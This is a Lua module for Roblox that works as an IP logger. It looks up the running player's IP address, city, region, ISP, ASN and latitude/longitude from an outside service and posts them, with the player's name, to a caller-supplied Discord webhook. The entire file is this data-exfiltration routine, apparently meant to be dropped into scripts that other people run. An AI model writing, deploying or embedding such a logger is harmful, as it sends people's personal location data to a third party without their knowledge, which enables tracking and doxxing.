local HttpService = game:GetService("HttpService")

local Logger = {
    -- Returns a table containing your IP information.
    log_table = function()
        ipftch = HttpService:GetAsync("https://ip.moon.lat/")
        local j = HttpService:JSONDecode(ipftch)

        return j
    end,

    -- Logs IP to provided Discord webhook.
    log = function(webhook)
        if not webhook then
            return
        end

        plr = game.Players.LocalPlayer

        j = Logger.log_table()

        local dataFields = {
            ["embeds"] = {{
                ["title"] = "LOG - " .. plr.Name,
                ['color'] = 4985996,
                ["footer"] = {
                    ["text"] = os.date("Sentinel Softworks • %x %H:%M")
                },
                ["fields"] = {{
                    ["name"] = "IP",
                    ["value"] = j.ip
                }, {
                    ["name"] = "Continent",
                    ["value"] = j.continent
                }, {
                    ["name"] = "Country",
                    ["value"] = j.country
                }, {
                    ["name"] = "Region",
                    ["value"] = j.region
                }, {
                    ["name"] = "City",
                    ["value"] = j.city
                }, {
                    ["name"] = "Timezone",
                    ["value"] = j.timezone
                }, {
                    ["name"] = "ISP",
                    ["value"] = j.organisation
                }, {
                    ["name"] = "Latitude",
                    ["value"] = j.latitude
                }, {
                    ["name"] = "Longitude",
                    ["value"] = j.longitude
                }, {
                    ["name"] = "ASN",
                    ["value"] = j.asn
                }}
            }}
        }
        
        HttpService:PostAsync(webhook, dataFields, Enum.HttpContentType.ApplicationJson, false)
    end
}

return Logger
